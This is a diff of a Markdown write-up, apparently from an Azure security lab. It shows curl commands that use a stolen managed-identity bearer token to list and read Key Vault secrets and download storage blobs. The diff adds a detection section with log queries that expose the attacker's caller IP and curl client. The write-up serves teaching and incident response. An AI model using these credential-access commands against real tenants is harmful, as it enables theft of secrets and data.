@@ -231,23 +231,23 @@ curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=
 List the secrets:
 
 ```bash
-export AZURE_BEARER_TOKEN=<SET TOKEN VALUE>
+export BEARER_TOKEN=<SET TOKEN VALUE>
 export VAULT_NAME=<ENTER_KEY_VAULT_NAME>
-curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
+curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
 ```
 
 List the versions for the secret:
 
 ```bash
-export COUGAR_DB_PASS=$(curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" | jq -r '.value[0].id' )
-curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0"
+export COUGAR_DB_PASS=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" | jq -r '.value[0].id' )
+curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0"
 ```
 
 Read a secret value:
 
 ```bash
-export COUGAR_DB_PASS_V0=$(curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0" | jq -r '.value[0].id')
-curl -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS_V0?api-version=7.0"
+export COUGAR_DB_PASS_V0=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0" | jq -r '.value[0].id')
+curl -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS_V0?api-version=7.0"
 ```
 
 ### Azure Storage
@@ -263,9 +263,9 @@ curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=
 List the storage account containers:
 
 ```bash
-export AZURE_BEARER_TOKEN=<SET TOKEN VALUE>
+export BEARER_TOKEN=<SET TOKEN VALUE>
 export STORAGE_ACCOUNT=<ENTER STORAGE ACCOUNT NAME>
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"
 ```
 
 OMG, you're killing me MS. XML? How the hell am I supposed to `jq` this now.
@@ -277,13 +277,13 @@ OMG, you're killing me MS. XML? How the hell am I supposed to `jq` this now.
 List the blobs in the images container:
 
 ```bash
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images?restype=container&comp=list"
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images?restype=container&comp=list"
 ```
 
 Download our target cougar image:
 
 ```bash
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images/cougar.jpg" --output ~/Downloads/cougar.jpg
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images/cougar.jpg" --output ~/Downloads/cougar.jpg
 ```
 
 ## Persistence
@@ -316,4 +316,63 @@ Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Final
 ```bash
 cat /tmp/malware.sh
 cat: /tmp/malware.sh: No such file or directory
+```
+
+## Monitoring &amp; Incident Response
+
+### Application Insights
+
+Logs and telemetry are automatically sent to Application Insights. Interesting note: The key in the `env` vars is all you need to send forged metrics to the insights log. Let's query some information about the Cougar execution.
+
+Insights query for Cougar invocations via the shutdown event:
+
+```
+traces
+| where customDimensions.['EventId'] == "5"
+| order by timestamp desc
+| limit 50
+```
+
+Insights query for access the secret being provisioned to the function:
+
+```
+traces
+| where customDimensions.['EventId'] == "8"
+| order by timestamp desc
+| limit 50
+```
+
+From what I can tell, there is no centralized "CloudTrail / IAM Audit Log" service in Azure. At least in a non-enterprise AD account. Querying the key vault monitoring log, which is not enabled by default you will find this. NOTE: Azure Security Center did recommend enabling logging on the key vault to generate this data.
+
+Viewing all actions taken against the `cougar-database-pass` secret:
+
+```
+AzureDiagnostics
+| where ResourceProvider == "MICROSOFT.KEYVAULT"
+| where id_s contains "cougar-database-pass" 
+| order by TimeGenerated desc
+```
+
+A normal entry comes from a Microsoft owned IP address and the `azuresdk` client:
+
+```
+TimeGenerated: 1/20/2020, 1:34:52.309 AM
+identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
+id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
+OperationName: SecretGet
+ResultType: Success
+CallerIPAddress: 40.81.2.152
+clientinfo_s: azsdk-net-Security.KeyVault.Secrets/4.0.1+d9d93df6c75797a6027c125ab3ff61b2ac894102 (.NET Core 3.1.0; Linux 4.19.84-microsoft-standard #1 SMP Wed Nov 13 13:08:05 UTC 2019)
+```
+
+Extracting the tokens shows the attacker's caller IP and client information:
+
+```
+TimeGenerated: 1/20/2020, 2:58:58.262 AM
+identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
+id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
+OperationName: SecretGet
+ResultType: Success
+CallerIPAddress: 95.025.143.109
+clientinfo_s: curl/7.64.1
 ```
